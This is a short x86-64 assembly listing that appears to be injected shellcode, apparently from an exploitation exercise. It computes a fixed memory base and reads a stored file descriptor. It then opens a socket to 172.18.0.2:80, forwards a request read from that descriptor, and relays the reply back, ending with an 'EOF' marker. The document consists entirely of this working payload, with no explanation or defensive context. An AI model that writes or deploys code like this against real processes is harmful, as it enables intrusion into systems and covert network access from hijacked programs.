_start:
  mov rdx, rdi
  shr rdx, 16
  shl rdx, 16
  add dx, 0xb00
  mov r15, rdx                  ; r15 = 0x600b00

  mov rdx, r15
  add dl, 0x24
  mov r13, [rdx]

;;; HTTP client
  push 0x020012ac               ; Address (172.18.0.2)
  push word 0x5000              ; Port (80)
  push word 2                   ; Address family
  push 42                       ;  connect syscall
  push byte 16                  ;  length
  push byte 41                  ;  socket syscall
  push byte 1                   ;  type (SOCK_STREAM)
  push byte 2                   ;  family (AF_INET)
  pop rdi                       ; family
  pop rsi                       ; type
  xor edx, edx                  ; protocol
  pop rax                       ; SYS_socket
  syscall

  mov r14, rax
  mov rdi, rax                  ; sockfd
  pop rdx                       ; length
  pop rax                       ; SYS_connect
  mov rsi, rsp                  ; sockaddr
  syscall

  mov rsi, r15
  add si, 0x210
  mov rdi, r13
  xor eax, eax
  syscall                       ; read(fd, url, 0x10);
  
  mov rdi, r14                  ; sockfd
  xor eax, eax
  inc eax                       ; SYS_write
  syscall

  mov dx, 0x100
  xor eax, eax                  ; SYS_read
  syscall

  mov rdi, r13
  xor eax, eax
  inc eax
  syscall                       ; SYS_write

  db  'E', 'O', 'F'
